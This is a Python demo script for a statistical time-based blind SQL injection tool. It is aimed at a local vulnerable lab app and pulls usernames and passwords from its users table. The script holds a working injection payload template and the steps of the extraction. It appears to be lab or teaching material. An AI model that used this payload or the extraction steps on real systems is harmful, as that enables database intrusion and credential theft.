#!/usr/bin/env python3
"""
Demo script for StatSQLi.
Shows the tool in action against the vulnerable lab application.
"""

import sys
import time
import sqlite3
import os
from pathlib import Path

# Add project to path
sys.path.insert(0, str(Path(__file__).parent))

from statsqli.main import StatSQLi


def get_available_users():
    """Get list of available users from the database."""
    # Try to find the database file (same logic as lab app)
    db_paths = ['lab/lab/vulnerable.db', 'lab/vulnerable.db', 'vulnerable.db']
    db_path = None
    
    for path in db_paths:
        if os.path.exists(path):
            try:
                conn = sqlite3.connect(path)
                cursor = conn.cursor()
                cursor.execute("SELECT id, username FROM users ORDER BY id")
                users = cursor.fetchall()
                conn.close()
                if users:
                    return users, path
            except Exception:
                pass
    
    # If database not found, return empty list
    return [], None


def print_banner():
    """Print welcome banner."""
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║         StatSQLi - Statistical SQL Injection Tool        ║
    ║                  Fast & Reliable Extraction              ║
    ╚═══════════════════════════════════════════════════════════╝
    
    This demo will extract data from a vulnerable web application
    using time-based blind SQL injection with statistical analysis.
    """)


def demo_extraction():
    """Run a demonstration extraction."""
    url = "http://127.0.0.1:5000/vulnerable?id=1"
    
    # For SQLite, we need a special payload since SLEEP() doesn't exist
    # The lab app simulates SLEEP() detection
    # Format: condition should be followed by AND SLEEP, like: (condition) AND SLEEP(2)
    payload_template = "1 OR ({condition}) AND SLEEP(2) -- -"
    
    print("[*] Initializing StatSQLi...")
    print(f"[*] Target: {url}")
    
    try:
        # Initialize tool with adaptive delay detection
        tool = StatSQLi(
            url=url,
            payload_template=payload_template,
            delay=None,  # Auto-detect
            parallel=True,
            max_workers=4
        )
        
        # Get available users dynamically from database
        users, db_path = get_available_users()
        
        # Ask which user to extract
        print("\n[*] Which user would you like to extract?")
        if users:
            user_list = ", ".join([f"{uid} ({username})" for uid, username in users])
            print(f"    Available users: {user_list}")
            valid_ids = [uid for uid, _ in users]
        else:
            print("    [Warning] Could not read users from database, using default IDs 1-5")
            print("    Available users: 1, 2, 3, 4, 5")
            valid_ids = list(range(1, 6))
        
        user_choice = input("    Enter user ID (default: 1): ").strip()
        
        # Parse user ID with error handling
        try:
            user_id = int(user_choice) if user_choice else 1
        except ValueError:
            print("[!] Invalid input, using default user ID (1)")
            user_id = 1
        
        if user_id not in valid_ids:
            print(f"[!] Invalid user ID, using default (1)")
            user_id = 1
        
        where_clause = f"id={user_id}"
        
        print("\n" + "="*60)
        print(f"DEMO 1: Extract username from user ID {user_id}")
        print("="*60)
        start_time = time.time()
        
        result = tool.extract_string_custom(
            table="users",
            column="username",
            where_clause=where_clause,  # Use specific user ID
            max_length=20
        )
        
        elapsed = time.time() - start_time
        
        print(f"\n[+] Extraction complete!")
        print(f"[+] Result: {result}")
        print(f"[+] Time taken: {elapsed:.2f} seconds")
        
        print("\n" + "="*60)
        print(f"DEMO 2: Extract password from user ID {user_id}")
        print("="*60)
        start_time = time.time()
        
        password = tool.extract_string_custom(
            table="users",
            column="password",
            where_clause=where_clause,  # Use specific user ID
            max_length=30
        )
        
        elapsed = time.time() - start_time
        
        print(f"\n[+] Extraction complete!")
        print(f"[+] Result: {password}")
        print(f"[+] Time taken: {elapsed:.2f} seconds")
        
        print("\n" + "="*60)
        print("SUMMARY")
        print("="*60)
        print(f"Username: {result}")
        print(f"Password: {password}")
        print("\n[*] StatSQLi successfully extracted data using:")
        print("    - Statistical timing analysis (Welch's t-test)")
        print("    - Binary search algorithm")
        print("    - Adaptive delay detection")
        print("    - Parallel extraction")
        
    except Exception as e:
        print(f"\n[!] Error during extraction: {e}")
        print("[!] Make sure the lab application is running:")
        print("    cd lab && python app.py")
        return False
    
    return True


def main():
    """Main demo function."""
    print_banner()
    
    print("[*] Make sure the vulnerable lab application is running!")
    print("[*] Start it with: cd lab && python app.py")
    print("[*] Then press Enter to continue...")
    input()
    
    print("\n[*] Starting demo extraction...\n")
    
    success = demo_extraction()
    
    if success:
        print("\n[+] Demo completed successfully!")
    else:
        print("\n[!] Demo failed. Check the error messages above.")
        sys.exit(1)


if __name__ == '__main__':
    main()

